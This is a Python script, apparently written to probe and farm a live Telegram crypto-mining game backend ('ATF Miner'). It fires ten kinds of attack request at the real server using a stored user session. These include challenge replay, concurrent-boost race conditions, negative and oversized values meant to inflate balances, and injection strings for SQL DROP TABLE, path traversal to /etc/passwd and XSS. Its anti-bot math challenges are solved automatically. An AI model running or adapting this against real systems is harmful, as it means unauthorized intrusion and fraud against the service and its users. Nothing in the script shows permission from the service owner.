#!/usr/bin/env python3
"""ATF Miner Bug Finder — tests 10 attack vectors against the backend"""
import requests, json, urllib.parse, time, re, sys

BASE = 'https://atfminers.asloni.online/miner'
INITDATA_FILE = '/root/urkocoin-farmer/.atf_initdata'

def load_initdata():
    with open(INITDATA_FILE) as f:
        return f.read().strip()

def get_user(init_data):
    params = urllib.parse.parse_qs(init_data)
    return json.loads(params.get('user', ['{}'])[0])

def api_call(action, init_data, tma_token, extra={}, timeout=15, retries=3):
    headers = {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Telegram-Init-Data': init_data,
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36'
    }
    if tma_token:
        headers['X-ATF-TMA-Session'] = tma_token
    
    body = {
        'initData': init_data,
        'request_id': str(int(time.time() * 1000)),
        'device_id': 'atf-miner-vps-001',
        'tg_id': 5184629862,
        **extra
    }
    
    url = f'{BASE}/index.php?action={action}&t={int(time.time()*1000)}'
    
    for attempt in range(retries):
        try:
            r = requests.post(url, headers=headers, json=body, timeout=timeout)
            return r.json()
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(2)
                continue
            return {'error': str(e)}

def parse_math(question):
    q = question.replace('×', '*').replace('÷', '/')
    m = re.match(r'(\d+)\s*([+\-*/])\s*(\d+)\s*=', q)
    if not m:
        m = re.match(r'(\d+)\s*([+\-*/])\s*(\d+)', q)
    if m:
        a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
        if op == '+': return a + b
        elif op == '-': return a - b
        elif op == '*': return a * b
        elif op == '/': return a // b
    return None

def test_vector(num, name, func):
    print(f"\n{'='*60}")
    print(f"TEST {num}: {name}")
    print(f"{'='*60}")
    try:
        result = func()
        return result
    except Exception as e:
        print(f"  Exception: {e}")
        return None

def main():
    init_data = load_initdata()
    user = get_user(init_data)
    tg_id = user['id']
    
    print(f"Loaded init data. tg_id={tg_id}")
    
    # Step 1: Login
    print("\n[LOGIN]")
    login_resp = api_call('login', init_data, None, {'username': user.get('username', '')})
    print(f"  Login response: {json.dumps(login_resp, indent=2)[:500]}")
    
    tma_token = login_resp.get('tma_session_token', '')
    if not tma_token:
        print("  FATAL: No TMA token received. Cannot proceed.")
        # Try to see if we got something else useful
        print(f"  Full login response: {json.dumps(login_resp)}")
        sys.exit(1)
    
    print(f"  Got TMA token: {tma_token[:20]}...")
    
    # Get an initial challenge for reuse tests
    print("\n[GET INITIAL CHALLENGE]")
    ch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'start_mine'})
    print(f"  Challenge response: {json.dumps(ch, indent=2)[:500]}")
    initial_challenge_id = ch.get('challenge_id', '')
    initial_question = ch.get('question', '')
    initial_answer = parse_math(initial_question) if initial_question else None
    print(f"  challenge_id={initial_challenge_id}, question={initial_question}, answer={initial_answer}")
    
    # Get a boost challenge for reuse tests
    ch2 = api_call('get_math_challenge', init_data, tma_token, {'scope': 'boost'})
    boost_challenge_id = ch2.get('challenge_id', '')
    boost_question = ch2.get('question', '')
    boost_answer = parse_math(boost_question) if boost_question else None
    print(f"  Boost: challenge_id={boost_challenge_id}, question={boost_question}, answer={boost_answer}")
    
    results = {}
    
    # ============================================================
    # TEST 1: Negative math_answer
    # ============================================================
    def t1():
        resp = api_call('start_mine', init_data, tma_token, {
            'challenge_id': initial_challenge_id,
            'answer': '-999',
            'scope': 'start_mine'
        })
        print(f"  Response: {json.dumps(resp)[:300]}")
        return resp
    
    results[1] = test_vector(1, "Negative math_answer (-999)", t1)
    time.sleep(2)
    
    # ============================================================
    # TEST 2: Huge number answer
    # ============================================================
    def t2():
        resp = api_call('start_mine', init_data, tma_token, {
            'challenge_id': initial_challenge_id,
            'answer': '999999999999999999',
            'scope': 'start_mine'
        })
        print(f"  Response: {json.dumps(resp)[:300]}")
        return resp
    
    results[2] = test_vector(2, "Huge number answer (999999999999999999)", t2)
    time.sleep(2)
    
    # ============================================================
    # TEST 3: Duplicate challenge_id
    # ============================================================
    def t3():
        # First use the challenge legitimately
        resp1 = api_call('start_mine', init_data, tma_token, {
            'challenge_id': initial_challenge_id,
            'answer': str(initial_answer),
            'scope': 'start_mine'
        })
        print(f"  First use: {json.dumps(resp1)[:300]}")
        time.sleep(1)
        
        # Try reusing same challenge_id
        resp2 = api_call('start_mine', init_data, tma_token, {
            'challenge_id': initial_challenge_id,
            'answer': str(initial_answer),
            'scope': 'start_mine'
        })
        print(f"  Reuse same challenge_id: {json.dumps(resp2)[:300]}")
        
        # Check if we got a balance from both
        bal1 = resp1.get('session_balance', resp1.get('mined', 0))
        bal2 = resp2.get('session_balance', resp2.get('mined', 0))
        print(f"  Balance after 1st: {bal1}, after 2nd: {bal2}")
        if bal2 and bal1 and bal2 > bal1:
            print("  *** BUG: Duplicate challenge_id increased balance! ***")
        return resp2
    
    results[3] = test_vector(3, "Duplicate challenge_id reuse", t3)
    time.sleep(2)
    
    # ============================================================
    # TEST 4: Empty/null challenge_id
    # ============================================================
    def t4():
        resp = api_call('start_mine', init_data, tma_token, {
            'challenge_id': '',
            'answer': '0',
            'scope': 'start_mine'
        })
        print(f"  Empty challenge_id: {json.dumps(resp)[:300]}")
        
        resp2 = api_call('start_mine', init_data, tma_token, {
            'challenge_id': None,
            'answer': '0',
            'scope': 'start_mine'
        })
        print(f"  Null challenge_id: {json.dumps(resp2)[:300]}")
        
        resp3 = api_call('activate_boost', init_data, tma_token, {
            'challenge_id': '',
            'answer': '1',
            'scope': 'boost',
            'display_preview': 0
        })
        print(f"  Empty boost challenge_id: {json.dumps(resp3)[:300]}")
        return resp3
    
    results[4] = test_vector(4, "Empty/null challenge_id", t4)
    time.sleep(2)
    
    # ============================================================
    # TEST 5: Replay old challenges
    # ============================================================
    def t5():
        # Get a fresh challenge, use it
        ch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'start_mine'})
        cid = ch.get('challenge_id', '')
        ans = parse_math(ch.get('question', ''))
        
        resp1 = api_call('start_mine', init_data, tma_token, {
            'challenge_id': cid,
            'answer': str(ans),
            'scope': 'start_mine'
        })
        print(f"  Original use: {json.dumps(resp1)[:300]}")
        time.sleep(1)
        
        # Wait a bit and try to replay
        time.sleep(3)
        resp2 = api_call('start_mine', init_data, tma_token, {
            'challenge_id': cid,
            'answer': str(ans),
            'scope': 'start_mine'
        })
        print(f"  Replay attempt: {json.dumps(resp2)[:300]}")
        
        if resp2.get('status') == 'success':
            print("  *** BUG: Old challenge replay accepted! ***")
        return resp2
    
    results[5] = test_vector(5, "Replay old challenges", t5)
    time.sleep(2)
    
    # ============================================================
    # TEST 6: Boost during cooldown
    # ============================================================
    def t6():
        # Start mining first
        ch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'start_mine'})
        cid = ch.get('challenge_id', '')
        ans = parse_math(ch.get('question', ''))
        resp = api_call('start_mine', init_data, tma_token, {
            'challenge_id': cid, 'answer': str(ans), 'scope': 'start_mine'
        })
        print(f"  Mining started: {json.dumps(resp)[:200]}")
        time.sleep(1)
        
        # First boost
        bch1 = api_call('get_math_challenge', init_data, tma_token, {'scope': 'boost'})
        bcid1 = bch1.get('challenge_id', '')
        bans1 = parse_math(bch1.get('question', ''))
        resp1 = api_call('activate_boost', init_data, tma_token, {
            'challenge_id': bcid1, 'answer': str(bans1), 'scope': 'boost', 'display_preview': 0
        })
        print(f"  First boost: {json.dumps(resp1)[:300]}")
        time.sleep(1)
        
        # Immediately try boost again (should be on cooldown)
        bch2 = api_call('get_math_challenge', init_data, tma_token, {'scope': 'boost'})
        bcid2 = bch2.get('challenge_id', '')
        bans2 = parse_math(bch2.get('question', ''))
        resp2 = api_call('activate_boost', init_data, tma_token, {
            'challenge_id': bcid2, 'answer': str(bans2), 'scope': 'boost', 'display_preview': 0
        })
        print(f"  Immediate 2nd boost (cooldown): {json.dumps(resp2)[:300]}")
        
        if resp2.get('status') == 'success':
            print("  *** BUG: Boost during cooldown accepted! ***")
        return resp2
    
    results[6] = test_vector(6, "Boost during cooldown", t6)
    time.sleep(2)
    
    # ============================================================
    # TEST 7: Race condition — start_mine + boost simultaneously
    # ============================================================
    def t7():
        import threading
        
        # Start mining
        ch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'start_mine'})
        cid = ch.get('challenge_id', '')
        ans = parse_math(ch.get('question', ''))
        resp1 = api_call('start_mine', init_data, tma_token, {
            'challenge_id': cid, 'answer': str(ans), 'scope': 'start_mine'
        })
        print(f"  Mining started: {json.dumps(resp1)[:200]}")
        
        # Now fire two boosts simultaneously
        results_list = [None, None]
        
        def fire_boost(idx):
            bch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'boost'})
            bcid = bch.get('challenge_id', '')
            bans = parse_math(bch.get('question', ''))
            resp = api_call('activate_boost', init_data, tma_token, {
                'challenge_id': bcid, 'answer': str(bans), 'scope': 'boost', 'display_preview': 0
            })
            results_list[idx] = resp
        
        t1_thread = threading.Thread(target=fire_boost, args=(0,))
        t2_thread = threading.Thread(target=fire_boost, args=(1,))
        
        t1_thread.start()
        t2_thread.start()
        t1_thread.join()
        t2_thread.join()
        
        print(f"  Boost 1: {json.dumps(results_list[0])[:300]}")
        print(f"  Boost 2: {json.dumps(results_list[1])[:300]}")
        
        s1 = results_list[0].get('status') if results_list[0] else None
        s2 = results_list[1].get('status') if results_list[1] else None
        if s1 == 'success' and s2 == 'success':
            print("  *** BUG: Both concurrent boosts accepted! ***")
        elif s1 == 'success' and s2 != 'success':
            print("  Normal: Only one boost won")
        return results_list
    
    results[7] = test_vector(7, "Race condition: concurrent boosts", t7)
    time.sleep(2)
    
    # ============================================================
    # TEST 8: Modify display_preview to huge number
    # ============================================================
    def t8():
        # Start mining first
        ch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'start_mine'})
        cid = ch.get('challenge_id', '')
        ans = parse_math(ch.get('question', ''))
        api_call('start_mine', init_data, tma_token, {
            'challenge_id': cid, 'answer': str(ans), 'scope': 'start_mine'
        })
        time.sleep(1)
        
        # Try boost with huge display_preview
        bch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'boost'})
        bcid = bch.get('challenge_id', '')
        bans = parse_math(bch.get('question', ''))
        
        resp = api_call('activate_boost', init_data, tma_token, {
            'challenge_id': bcid,
            'answer': str(bans),
            'scope': 'boost',
            'display_preview': 999999999
        })
        print(f"  Huge display_preview: {json.dumps(resp)[:500]}")
        
        # Check if it affected anything
        sync = api_call('sync_mining_state', init_data, tma_token, {'client_boost_cycle_seconds': 0})
        print(f"  Post-boost sync: {json.dumps(sync)[:300]}")
        return resp
    
    results[8] = test_vector(8, "Huge display_preview value", t8)
    time.sleep(2)
    
    # ============================================================
    # TEST 9: Crafted request_id values
    # ============================================================
    def t9():
        headers = {
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Telegram-Init-Data': init_data,
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36',
            'X-ATF-TMA-Session': tma_token
        }
        
        crafted_ids = [
            '-1',
            '0',
            'null',
            "'; DROP TABLE users; --",
            '../../etc/passwd',
            '<script>alert(1)</script>',
            'AAAAAAAAAA' * 100,  # very long
            'true',
            '{}',
            '[]',
        ]
        
        all_ok = True
        for rid in crafted_ids:
            body = {
                'initData': init_data,
                'request_id': rid,
                'device_id': 'test',
                'tg_id': tg_id,
            }
            try:
                r = requests.post(f'{BASE}/index.php?action=start_mine&t={int(time.time()*1000)}',
                                 headers=headers, json=body, timeout=10)
                resp = r.json()
                status = resp.get('status', resp.get('error', 'unknown'))
                print(f"  request_id={repr(rid)[:30]:30s} → status={status}, msg={resp.get('message','')[:60]}")
                if status == 'success':
                    print(f"    *** BUG: Crafted request_id '{rid[:20]}' accepted! ***")
                    all_ok = False
            except Exception as e:
                print(f"  request_id={repr(rid)[:30]:30s} → error={e}")
            time.sleep(0.5)
        
        return all_ok
    
    results[9] = test_vector(9, "Crafted request_id values", t9)
    time.sleep(2)
    
    # ============================================================
    # TEST 10: Manipulated client_boost_cycle_seconds
    # ============================================================
    def t10():
        # Start mining
        ch = api_call('get_math_challenge', init_data, tma_token, {'scope': 'start_mine'})
        cid = ch.get('challenge_id', '')
        ans = parse_math(ch.get('question', ''))
        api_call('start_mine', init_data, tma_token, {
            'challenge_id': cid, 'answer': str(ans), 'scope': 'start_mine'
        })
        time.sleep(1)
        
        # Try various boost cycle values
        values = [-999, 0, 1, 86400, 999999999]
        for val in values:
            resp = api_call('sync_mining_state', init_data, tma_token, {
                'client_boost_cycle_seconds': val
            })
            bal = resp.get('session_balance', '?')
            mined = resp.get('total_mined_this_session', '?')
            print(f"  client_boost_cycle_seconds={val:12d} → balance={bal}, mined={mined}")
        
        # Try negative value
        resp = api_call('sync_mining_state', init_data, tma_token, {
            'client_boost_cycle_seconds': -1
        })
        bal = resp.get('session_balance', '?')
        mined = resp.get('total_mined_this_session', '?')
        print(f"  NEGATIVE client_boost_cycle_seconds → balance={bal}, mined={mined}")
        if isinstance(mined, (int, float)) and mined > 0:
            print("  *** BUG: Negative boost_cycle_seconds produced mined balance! ***")
        return resp
    
    results[10] = test_vector(10, "Manipulated client_boost_cycle_seconds", t10)
    
    # ============================================================
    # SUMMARY
    # ============================================================
    print(f"\n{'='*60}")
    print("SUMMARY OF FINDINGS")
    print(f"{'='*60}")
    
    bugs_found = []
    
    # Analyze results
    for num, resp in results.items():
        if resp is None:
            continue
        
        if isinstance(resp, dict):
            status = resp.get('status', '')
            if status == 'success':
                bugs_found.append(f"  Test {num}: Server accepted manipulated request")
            
            # Check for unexpected data leaks
            for key in ['debug', 'trace', 'error', 'stack', 'version', 'server', 'php']:
                if key in str(resp).lower():
                    bugs_found.append(f"  Test {num}: Potential info leak ('{key}' in response)")
            
            # Check for SQL error patterns
            resp_str = json.dumps(resp).lower()
            for pattern in ['sql', 'mysql', 'syntax', 'column', 'table', 'query', 'database']:
                if pattern in resp_str:
                    bugs_found.append(f"  Test {num}: SQL-related error in response: '{pattern}'")
    
    if bugs_found:
        print("BUGS FOUND:")
        for b in bugs_found:
            print(b)
    else:
        print("No obvious bugs found in basic testing.")
    
    # Save full results
    with open('/root/urkocoin-farmer/atf_bug_results.json', 'w') as f:
        serializable = {}
        for k, v in results.items():
            if isinstance(v, (dict, list)):
                serializable[k] = v
            elif isinstance(v, bool):
                serializable[k] = v
            else:
                serializable[k] = str(v)
        json.dump(serializable, f, indent=2)
    print(f"\nFull results saved to /root/urkocoin-farmer/atf_bug_results.json")

if __name__ == '__main__':
    main()
